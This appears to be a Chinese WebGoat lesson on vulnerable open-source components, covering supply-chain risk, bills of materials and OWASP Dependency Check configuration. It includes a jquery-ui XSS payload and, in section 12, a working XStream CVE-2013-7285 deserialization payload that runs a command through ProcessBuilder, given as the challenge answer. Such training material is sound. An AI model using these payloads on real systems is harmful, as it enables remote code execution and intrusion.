---
id: CWE-78
title: Vulnerable Components
---
<!-- muse start -->
Web Goat 对软件供应链的低质量文档。
查看 CVE 页面获取详情文章的 URL，找到漏洞的说明与示例。
<!-- muse end -->

## 1. 概念

我们的软件构建方式已经发生改变。开源社区日趋成熟，开源软件的可用性变得极其丰富，但人们往往忽略了确定应用程序中所使用库的来源问题。参考：[软件供应链](https://www.sonatype.com/state-of-the-software-supply-chain/introduction)

本课程将探讨管理依赖库的难点、未管理这些依赖项的风险，以及判断自身是否面临风险的困难。

### 目标

- 认识到所使用的开源软件与自定义代码同等重要
- 了解当前开源组件使用过程中的管理现状（或管理缺失问题）
- 理解物料清单在评估开源组件风险中的重要性

## 2. 开源生态系统

- 超过1000万个GitHub代码仓库
- 100万个Sourceforge代码仓库
- 2500个公共二进制仓库
    - 部分仓库设有严格的发布者标准
        - 部分仓库强制要求源代码分发
        - 无法保证发布的源代码与已发布二进制文件的源代码一致
    - 部分仓库允许为同一版本重新发布不同的二进制文件集合
    - 部分仓库允许删除已发布的构件
- 存在多种不同的打包系统（即使针对同一编程语言）
- 采用不同的坐标系和粒度级别

## 4. 组件无处不在

WebGoat使用了近200个Java和JavaScript库。与大多数Java应用程序类似，我们使用Maven管理Java依赖项，而对JavaScript库的管理则采取放任自流的策略。

### WebGoat中存在易受攻击的组件吗？

在本课程创建时，WebGoat的组件中包含十多个高危安全风险。其中大多数并非故意引入。开发人员如何在上百个组件中追踪这些信息？

![WebGoat-Vulns.png](./images/WebGoat-Vulns.png)
*Web Goat：WebGoat安全问题*

## 5. 漏洞并非总是存在于"你的"代码中

以下示例展示了使用相同的WebGoat源代码，但不同版本的jquery-ui组件的情况。其中一个版本存在漏洞，另一个则没有。

### jquery-ui:1.10.4（存在漏洞）

此示例允许用户指定jquery-ui对话框的"closeText"内容。虽然这是不太可能的开发场景，但jquery-ui对话框未对关闭对话框按钮文本中的XSS攻击进行防护。

点击执行将触发jquery-ui关闭对话框：	
`OK<script>alert('XSS')</script>`
该对话框应已利用jquery-ui:1.10.4中的已知缺陷并允许XSS攻击发生（虽然实际上无效）

### jquery-ui:1.12.0（无漏洞）

使用相同的WebGoat源代码，但将jquery-ui库升级到无漏洞版本即可消除该漏洞利用。

点击执行将触发jquery-ui关闭对话框：	
`OK<script>alert('XSS')</script>`
该对话框应已通过使用WebGoat中完全相同的代码，但采用更新版本的jquery-ui来阻止上述漏洞利用

## 6. 了解开源软件"物料清单"是起点

现代应用程序由自定义代码和众多开源组件构成。开发者通常对其自定义代码非常熟悉，但对其所使用的库/组件的潜在风险了解较少。可将物料清单视为配方中的成分列表。

### 我们应明确答案的关键问题

- 如何知晓应用程序中包含哪些开源组件？
    - 如何了解正在使用的开源组件版本？
- 如何定义开源组件的风险？
- 如何发现开源组件的风险？
    - 如何将特定风险关联到开源组件的特定版本？
- 如何获知组件发布新版本的时间？
- 如何知晓先前"安全"的组件是否发现新漏洞？
- 如何确认使用的开源组件是否为正版版本？

## 7. 如何生成物料清单

目前存在多种开源及商业解决方案可用于识别组件风险，但能够提供应用程序完整"成分"清单的工具并不多见。OWASP Dependency Check 具备生成物料清单并识别潜在安全风险的能力。

该工具通过多项证据确定库名称。例如，您可将 OWASP Dependency Check 作为插件添加到 Maven 项目的 pom.xml 中。插件会从公共漏洞数据库下载信息，检测是否使用了存在漏洞的库，并标注已报告的漏洞类型。

在开发流水线中，可配置插件在发现开发团队未意识到的违规项时使构建失败。此外，可通过 XML 文件对部分违规项进行豁免，若相关漏洞在您的应用中无法被利用则建议采用此方式。

WebGoat 的父 pom.xml 中提供了配置示例：

```xml
<plugin>
        <groupId>org.owasp</groupId>
        <artifactId>dependency-check-maven</artifactId>
        <version>5.3.2</version>
        <configuration>
                <failBuildOnCVSS>7</failBuildOnCVSS>
                <skipProvidedScope>true</skipProvidedScope>
                <skipRuntimeScope>true</skipRuntimeScope>
                <suppressionFiles>
                        <suppressionFile>project-suppression.xml</suppressionFile>
                </suppressionFiles>
        </configuration>
        <executions>
                <execution>
                        <goals>
                                <goal>check</goal>
                        </goals>
                </execution>
        </executions>
</plugin>
```

以及违规项豁免的示例：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<suppressions xmlns="https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd">
    <suppress base="true">
        <cpe>cpe:/a:pivotal_software:spring_security</cpe>
        <cve>CVE-2018-1258</cve>
    </suppress>
    <suppress base="true"><!-- webgoat-server -->
        <cpe>cpe:/a:postgresql:postgresql</cpe>
        <cve>CVE-2018-10936</cve>
    </suppress>
</suppressions>
```

在 WebGoat 中，运行以下命令（owasp 配置文件）时插件会被激活：

```bash
mvn clean install -Powasp
```

下方是报告片段示例（路径示例：webgoat-container/target/dependency-check-report.html）：

![物料清单](./images/OWASP-Dep-Check.png)
*Web Goat：OWASP-Dep-Check.png*

## 8. 安全信息过载

### 核心关注点

- 我的组件是否可被利用？
- 我的组件是否为正版副本？
    - 我是否理解组件被修改的原因？

### 安全信息分散现状

- 安全通告来源碎片化
    - 国家漏洞数据库收录8万多个CVE条目
    - 节点安全项目、Metasploit、VulnDB、Snyk等多平台数据
    - 数千个网站安全通告、博客、推文等信息源

- 动态数据规模，GitHub每日产生60万次事件
    - 其中700次为安全相关事件
    - 版本说明、变更日志、代码注释等非结构化信息

## 9. 许可证信息过载

### 核心关注点

- 我能否在软件分发场景下使用该组件？
- 是否存在许可证兼容性问题？
- 若使用修改后的组件，是否已履行附加的许可证义务？

### 许可证信息分散现状

- 项目声明许可证的多种方式：
    - 项目元数据文件中声明
    - 项目网站或源代码仓库页面标注
    - 源代码仓库内通过链接指向许可证文件
    - 项目源码树中的许可证文件
    - 二进制文件META-INF文件夹内包含
- 源代码头部以注释形式包含许可证声明

## 10. 架构信息

### 核心关注点

- 我的组件属于老旧版本还是稳定版本？
- 我的组件是否属于冷门组件？
- 未升级组件是出于主动选择还是认知缺失？

### 总结

- 保持组件更新面临实际困难
- 对25,000个应用的分析数据显示：
    - 使用满2年的组件中，8%不存在新版本
    - 使用满11年的组件中，23%不存在新版本
    - 老旧组件构成主要风险来源

![老旧组件现状](./images/Old-Components.png)
*图示：老旧组件分布*

![老旧组件风险](./images/Risk-of-Old-Components.png)
*图示：老旧组件风险分析*

## 11. 开源软件风险案例

### Apache Commons Collections 漏洞事件

2015年11月，Apache Commons Collections组件的最新版本已发布8年之久。该组件长期被视为稳定可靠的依赖库，但研究人员发现其存在可导致远程代码执行的反序列化漏洞利用方式。消息披露后，所有使用该组件的开发团队陷入安全应急状态。

参考链接：[Thousands of Java applications vulnerable to nine-month-old remote code execution exploit](http://www.pcworld.com/article/3004633/business-security/thousands-of-java-applications-vulnerable-to-nine-month-old-remote-code-execution-exploit.html)

### XStream 反序列化漏洞案例

XStream作为相对常见的XML/JSON解析库，曾被曝出危害严重的远程代码执行漏洞。安全研究人员Dinis Cruz与Alvaro Muñoz通过概念验证代码展示了漏洞利用细节。

参考资料：
- [Dinis Cruz技术博客](https://diniscruz.blogspot.com/2013/12/xstream-remote-code-execution-exploit.html)
- [pwntester/XStreamPOC](https://github.com/pwntester/XStreamPOC)

**操作建议**：在进行本课程实践前，建议先阅读相关技术文章。请尝试在WebGoat环境中复现该漏洞利用过程。

## 12. 利用CVE-2013-7285（XStream）漏洞

<https://nvd.nist.gov/vuln/detail/CVE-2013-7285>

本课程仅在使用WebGoat的Docker镜像时有效。

WebGoat使用XML文档向联系人数据库添加联系人记录：

```xml
<contact>
    <id>1</id>
    <firstName>Bruce</firstName>
    <lastName>Mayhew</lastName>
    <email>webgoat@owasp.org</email>
</contact>
```

本练习所需的Java接口为：
`org.owasp.webgoat.lessons.vulnerablecomponents.Contact`。系统允许直接输入XML格式的联系人数据（无需拦截修改请求），WebGoat将使用`XStream.fromXML(xml)`方法将其转换为Contact对象。

访问 CVE 页面，从列出的多个参考 URL 中查看文章
<https://x-stream.github.io/CVE-2013-7285.html>

### 漏洞原理

该漏洞本质是**反序列化类型注入攻击**。XStream在反序列化时会根据XML中的类型标识动态创建对象实例，攻击者通过伪造类型信息注入恶意对象链，最终实现远程代码执行。

### 攻击链分析

```xml
<!-- 攻击载荷结构解析 -->
<contact class='dynamic-proxy'>          ← 声明动态代理类型
  <interface>org.company.model.Contact</interface>  ← 指定代理接口
  <handler class='java.beans.EventHandler'>        ← 注入事件处理器
    <target class='java.lang.ProcessBuilder'>      ← 绑定进程构建器
      <command><string>calc.exe</string></command> ← 植入系统命令
    </target>
    <action>start</action>               ← 触发执行动作
  </handler>
</contact>
```

执行反序列化代码：

```java
XStream xstream = new XStream();
Contact contact = (Contact)xstream.fromXML(xml);
```

### 技术要点说明

1. **动态代理滥用**  
   XStream支持`dynamic-proxy`类型标识，使攻击者能够创建实现指定接口的代理实例
   
2. **事件处理器漏洞利用**  
   `EventHandler`的`setTarget()`和`setAction()`方法可绑定任意对象和方法调用
   
3. **命令执行触发条件**  
    当代码调用代理接口方法时（Contact实例的任何方法，如`contact.getFirstName()`），恶意负载即被触发（EventHandler会自动执行`ProcessBuilder.start()`）
   当，

修改其示例代码并提交即可通过挑战

```xml
<contact class='dynamic-proxy'>
  <interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>calc.exe</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>
```


## 13. 总结

- 现代应用程序中的开源组件使用量持续增长。
- 开源组件来源多样，存在质量差异。
- 漏洞安全信息分散且难以统一获取。
- 许可证信息验证复杂度高。
- 多数团队缺乏系统化的组件升级策略。
- 开源组件已成为新型攻击载体。

### 行动建议

- 生成开源软件物料清单（OSS BOM）。
    - 引入[自动化工具链](http://lmgtfy.com/?q=OSS+bill+of+materials)。
- 建立企业级开源组件使用基线。
- 制定开源组件风险管理策略，有效管控现有风险并预防潜在威胁。
